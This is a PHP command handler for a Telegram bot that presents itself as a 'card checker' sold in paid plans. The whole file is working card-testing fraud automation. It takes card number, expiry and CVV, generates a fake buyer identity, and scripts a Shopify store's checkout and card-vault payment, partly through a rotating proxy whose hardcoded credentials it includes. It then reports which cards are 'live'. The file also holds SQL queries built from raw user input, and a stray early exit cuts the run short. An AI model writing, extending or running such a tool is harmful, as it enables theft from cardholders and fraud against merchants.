<?php
require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/po" or $cmd == ".po" or $cmd == "!po" or $cmd == "?po" or $cmd == "#po" or $cmd == ":po" or $cmd == ",po"){ 
// A part for gatecmd clearance
   $gatecmd = 'po';
    $lista = explode(" ", $text)[1];
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='as'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    

      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{} 
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);

    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
    $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }


        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
$starttime = microtime(true);
$mytime = 'time1';

//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('unodostrescuatro'));
$last = ucfirst(str_shuffle('cincoseissieteocho'));
$inc = ucfirst(str_shuffle('AmazonAppleas'));
$email = "sexolandia".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};
function getDatas($string, $start,$end){
    $uno = explode($start, $string);
    $dos = explode($end,$uno[1]);
    return $dos[0];
}

     
$content2 = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];

$cookie = uniqid();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/cart/add.js');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_type=product&utf8=%E2%9C%93&id=39305235628125&quantity=1');
$r2 = curl_exec($ch);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/checkout');

$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
$r2 = curl_exec($ch);
$url = getDatas($r2, 'novalidate" action="/', '"');
$token = getDatas($r2, 'authenticity_token" value="', '"');

/*if(empty($token)){
$fileName = "cookies/SH(".$cc.").txt"; 
     
    $ruta = fopen($fileName, "a") or die();
    fwrite($ruta, $r2); 
   fclose($ruta);
*/
        $content = ['chat_id' => $chat_id, 'text' => "$token", 'message_id' => $m2i, 'parse_mode' => 'html'];
        EditMessageText($content);
exit();

$content3 = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/'.$url.'');
        curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
        curl_setopt($ch, CURLOPT_POST, 1);
        $headers = array();
        $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
        $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
        $headers[] = 'content-type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
        curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$last.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($address).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Kenai&checkout%5Bshipping_address%5D%5Bprovince%5D=AK&checkout%5Bshipping_address%5D%5Bzip%5D=99611&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=599&checkout%5Bclient_details%5D%5Bbrowser_height%5D=661&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360');
        $r2 = curl_exec($ch);
        $token = getDatas($r2, 'authenticity_token" value="', '"');

        $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/'.$url.'');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping%2520%28non-contiguous%2520U.S.%29-5.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=616&checkout%5Bclient_details%5D%5Bbrowser_height%5D=661&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360');
$r2 = curl_exec($ch);

$precio = getDatas($r2, 'data-checkout-payment-due-target="', '"');
$token = getDatas($r2, 'authenticity_token" value="', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/json';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc1.' '.$cc2.' '.$cc3.''.$cc4.'","name":"'.$name.' '.$last.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"nothingnew.com"}');
$r2 = curl_exec($ch);
$id = getDatas($r2,'id":"','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/'.$url.'');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=37350408285&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D='.$precio.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=616&checkout%5Bclient_details%5D%5Bbrowser_height%5D=661&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360');
$r2 = curl_exec($ch);




 $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];
sleep(6);
#------------ R2 PAYPAL ------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://nothingnew.com/'.$url.'/processing?from_processing_page=1');

$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/cookie'.$cookie.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/cookie'.$cookie.'.txt');
$r2 = curl_exec($ch);

$message = getDatas($r2, 'notice__content"><p class="notice__text">', '</p>');
#------------ R2 PAYPAL END ------------#


$codeslives = array('EXISTING_ACCOUNT_RESTRICTED', 'INVALID_SECURITY_CODE', 'INVALID_BILLING_ADDRESS');

if (strpos($r2, 'confirmation email')) {
	$status = "Approved ✅️";
    $message = "Approved";
}elseif (strpos($r2, 'Declined CVV') or strpos($r2, 'Funds')) {
	$status = "Approved ✅️";
}else{
	$status = "Declined ❌️";
}


$m = "𝙈𝙞𝙠𝙖𝙯𝙖 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 元
━━━━━━━━━━━━━━━━━━
𝗖𝗖 ➜<code>$cc|$mes|$ano|$cvv</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ➜ $status
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ $message
━━━━━━━━━━━━━━━━━━
𝗕𝗶𝗻 ➜ <code>$bin</code> 
𝗧𝘆𝗽𝗲 ➜ $brand - $type - $level
𝗕𝗮𝗻𝗸 ➜ $bank
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ $country $emoji
━━━━━━━━━━━━━━━━━━
𝗣𝗿𝗼𝘅𝘆 ➜ 𝗟𝗶𝘃𝗲 ✅
𝗧𝗮𝗸𝗲𝗻 ➜ $mytime($starttime) Seconds
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Levi
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ @$username <b>[$plan]</b>
";

        $content = ['chat_id' => $chat_id, 'text' => "$m", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
